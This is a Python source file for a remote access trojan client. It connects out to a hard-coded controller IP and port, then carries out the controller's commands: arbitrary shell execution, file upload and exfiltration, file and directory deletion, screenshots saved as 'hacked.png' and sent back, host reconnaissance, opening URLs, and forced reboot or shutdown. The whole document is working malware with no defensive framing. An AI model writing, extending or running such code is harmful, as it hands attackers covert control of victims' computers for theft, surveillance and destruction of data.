import socket
import subprocess
import os
import psutil
from psutil._common import bytes2human
import platform
import webbrowser
import pyautogui

def os_info():
    info = {
        'Operating System': platform.system(),
        'Python Version': platform.python_version(),
        'Bit Version': platform.machine(),
        'HostName': socket.gethostbyname(socket.gethostname()),
        'Login Name': os.getlogin(),
        'OS Name': os.name,
    }
    return info

def get_cpu_info():
    cpu_info = ""
    for num, percent in enumerate(psutil.cpu_percent(percpu=True)):
        cpu_info += f"CPU{num}: {percent}%\n"
    return cpu_info

def get_memory_info():
    try:
        result = subprocess.run(['free'], capture_output=True, shell=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return f"Error: {result.stderr.strip()}"
    except Exception as e:
        return f"Error: {str(e)}"

def get_network_info():
    network_info = ""
    af_map = {
        socket.AF_INET: 'IPv4',
        socket.AF_INET6: 'IPv6',
    }
    interfaces = psutil.net_if_addrs()
    for interface, addresses in interfaces.items():
        network_info += f"Network Interface: {interface}\n"
        for addr in addresses:
            network_info += f"  Address Type: {af_map.get(addr.family, addr.family)}\n"
            network_info += f"  Address: {addr.address}\n"
            if addr.broadcast:
                network_info += f"    Broadcast Address: {addr.broadcast}\n"
            if addr.netmask:
                network_info += f"    Netmask: {addr.netmask}\n"
    return network_info

def execute_command(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
        else:
            return f"Error: {result.stderr.strip()}"
    except Exception as e:
        return f"Error: {str(e)}"

def main():
    ip = '192.168.1.36' 
    port = 4545  

    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.connect((ip, port))
            print("Connected to server.")
        
            while True:
                command = s.recv(8192).decode()
                
                if not command:
                    continue

                if command == 'exit':
                    break

                elif command == 'execute':
                    cmd = s.recv(8192).decode()
                    output = execute_command(cmd)
                    s.send(output.encode())

                elif command.startswith('openfile'):
                    filename = command.split(" ", 1)[1]
                    try:
                        with open(filename, "r") as file:
                            content = file.read()
                        s.sendall(content.encode())
                    except FileNotFoundError:
                        s.send("File not found".encode())
                    except Exception as e:
                        s.send(f"Error: {str(e)}".encode())

                elif command.startswith('deletefile'):
                    filename = command.split(" ", 1)[1]
                    try:
                        os.remove(filename)
                        s.send(f"{filename} has been successfully deleted.".encode())
                    except FileNotFoundError:
                        s.send(f"{filename} not found".encode())
                    except Exception as e:
                        s.send(f"Error: {str(e)}".encode())

                elif command.startswith('deletedirectory'):
                    target_directory = command.split(" ", 1)[1]
                    try:
                        os.rmdir(target_directory)
                        s.send(f"{target_directory} has been successfully deleted.".encode())
                    except FileNotFoundError:
                        s.send(f"{target_directory} not found".encode())
                    except Exception as e:
                        s.send(f"Error: {str(e)}".encode())
                    
                elif command.startswith('ls') or command.startswith('dir'):
                    files = os.listdir()
                    if files:
                        s.send("\n".join(files).encode())
                    else:
                        s.send("Directory is empty".encode())

                elif command.startswith('cd'):
                    target_folder = command.split(" ", 1)[1]
                    try:
                        os.chdir(target_folder)
                        s.send(f"Directory changed to: {os.getcwd()}".encode())
                    except FileNotFoundError:
                        s.send("Error: Directory not found".encode())
                    except Exception as e:
                        s.send(f"Error: {str(e)}".encode())

                elif command.startswith('createdirectory'):
                    target_folder = command.split(" ", 1)[1]
                    try:
                        os.mkdir(target_folder)
                        s.send(f"{target_folder} has been successfully created.".encode())
                    except FileExistsError:
                        s.send(f"{target_folder} already exists.".encode())
                    except Exception as e:
                        s.send(f"Error: {str(e)}".encode())

                elif command.startswith("createfile"):
                    filename = command.split(" ", 1)[1]
                    with open(filename, "w") as file:
                        pass
                    s.send("File created.".encode())
            
                elif command.startswith("editfile"):
                    parts = command.split(" ")
                    file_name_index = parts.index(">>") + 1
                    file_name = parts[file_name_index]
                    text = " ".join(parts[1:file_name_index-1])
                    with open(file_name, "a") as file:
                        file.write(text)
                    s.send("Text appended to file.".encode())
                
                elif command == "whoami":
                    result = subprocess.run(['whoami'], capture_output=True, text=True)
                    s.send(result.stdout.encode())
                
                elif command == "ifconfig":
                    x = get_network_info()
                    s.send(x.encode())
                
                elif command == "cpu":
                    x = get_cpu_info()
                    s.send(x.encode())
                
                elif command == "memory":
                    x = get_memory_info()
                    s.send(x)
                
                elif command == "osinfo":
                    os_info_data = os_info()
                    formatted_str = ""
                    for key, value in os_info_data.items():
                        formatted_str += f"{key}: {value}\n"
                    s.send(formatted_str.encode())
                    
                elif command == 'upload':
                    filename = s.recv(8192).decode()
                    with open(filename, 'wb') as file:
                        while True:
                            data = s.recv(8192)
                            if data.endswith('UPLOAD_COMPLETE'.encode()):
                                file.write(data[:-len('UPLOAD_COMPLETE'.encode())])
                                break
                            file.write(data)
                            
                elif command == 'download':
                    filename = s.recv(8192).decode()
                    try:
                        with open(filename, 'rb') as file:
                            while (data := file.read(8192)):
                                if not data:
                                    s.send('File is empty'.encode())
                                    continue
                                else:    
                                    s.send(data)
                                    s.send('DOWNLOAD_COMPLETE'.encode())
                    except FileNotFoundError:
                        s.send('ERROR: File not found.'.encode())
        
                elif command == 'screenshot':
                    screenshot = pyautogui.screenshot()
                    screenshot.save("hacked.png")
                    with open("hacked.png", 'rb') as file:
                        while True:
                            file_data = file.read(8192)
                            if not file_data:
                                break
                            s.send(file_data)
                    os.remove("hacked.png")
                    s.send("screenshot_complete".encode())
                    
                elif command.startswith('browser'):
                    link = command.split(" ", 1)[1]
                    if not link.startswith(("http://", "https://")):
                        link = "http://" + link
                    try:
                        webbrowser.open(link)
                        s.send('URL Opened.'.encode())
                    except Exception as e:
                        s.send(f'Error opening URL: {str(e)}'.encode())
                        
                elif command == 'restart':
                    x = os.name
                    if x == 'posix':
                        result = subprocess.run(['sudo', 'reboot'], shell=True, capture_output=True, text=True)
                    elif x == 'nt':
                        result = subprocess.run(['shutdown', '/r', '/t', '0'], shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        s.send(result.stdout.strip().encode())
                    else:
                        s.send(result.stderr.strip().encode())
                        
                elif command == 'poweroff':
                    x = os.name
                    if x == 'posix':
                        result = subprocess.run(['shutdown', '-h', 'now'], shell=True, capture_output=True, text=True)
                    elif x == 'nt':
                        result = subprocess.run(['shutdown', '/s'], shell=True, capture_output=True, text=True)
                    
                    if result.returncode == 0:
                        s.send(result.stdout.strip().encode())
                    else:
                        s.send(result.stderr.strip().encode())
                        
    print("Connection closed.")

if __name__ == "__main__":
    main()
